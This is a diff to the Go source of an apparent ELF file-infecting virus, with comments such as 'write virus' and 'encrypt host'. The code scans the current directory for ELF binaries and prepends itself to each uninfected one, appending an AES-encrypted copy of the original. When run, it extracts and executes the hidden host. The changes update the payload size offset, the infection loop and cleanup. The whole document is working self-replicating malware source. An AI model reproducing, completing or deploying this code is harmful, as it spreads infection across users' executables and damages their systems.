@@ -33,8 +33,8 @@ import (
     "crypto/aes"
     "crypto/cipher"
     "math/rand"
-    "time"
-	"path"  
+    "time"   
+
 )
 
 func check(e error) {
@@ -101,15 +101,13 @@ func Infect(file string) {
     encDat := Encrypt(dat) //encrypt host
     
     f, err := os.OpenFile(file, os.O_RDWR , 0666) //open host
-    
-	check(err)
+    check(err)
     
     w := bufio.NewWriter(f)
     w.Write(vir) //write virus
     w.Write(encDat) //write encypted host
     w.Flush() //make sure we are all set
     f.Close()
-    
 }
    
 func RunHost() {
@@ -122,12 +120,12 @@ func RunHost() {
     infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
     check(err)
     allSZ := len(infected_data) //get file full size
-    hostSZ := allSZ - 2492528 //calculate host size
+    hostSZ := allSZ - 2664960 //calculate host size
     
-    f, err := os.OpenFile(os.Args[0], os.O_RDWR, 0666) //open host
+    f, err := os.Open(os.Args[0]) //open host
     check(err)
         
-    f.Seek(2492528, os.SEEK_SET) //go to host start
+    f.Seek(2664960, os.SEEK_SET) //go to host start
     
     hostBuf := make([]byte, hostSZ)
     f.Read(hostBuf) //read it
@@ -143,6 +141,8 @@ func RunHost() {
     os.Chmod(hostbytes, 0755) //give it proper permissions
     cmd := exec.Command(hostbytes) 
     cmd.Start() //execute it
+	err = cmd.Wait()
+	os.Remove(hostbytes)
 }
  
 func Encrypt(toEnc []byte) []byte {
@@ -208,27 +208,25 @@ func GetSz(file string) int64 {
 }
 
 func main() {
+    
+    virPath := os.Args[0]
 
-    files, _ := ioutil.ReadDir(".")
-    for _, f := range files { 
-            //pwd, err := os.Getwd()
-            //check(err)
-            //fPath := pwd + "/" + f.Name()
-			virPath := path.Base(os.Args[0])
-			fPath := path.Base(f.Name())
+	files, _ := ioutil.ReadDir(".")
+	for _, f := range files {
+		if CheckELF(f.Name()) == true {
+			if CheckInfected(f.Name()) == false {
+				if !strings.Contains(virPath, f.Name()) {
+					Infect(f.Name())
+				}	
+			}	
+		}
+	}
 
-            if CheckELF(fPath) == true  { 
-                if CheckInfected(fPath) == false {
-					if fPath != virPath {
-                    	Infect(fPath)
-					}
-                }
-            }
-    }
         
-    if GetSz(os.Args[0]) > 2492528 {
+    if GetSz(os.Args[0]) > 2664960 {
         RunHost()
     } else {
         os.Exit(0)
     }
+	
 }
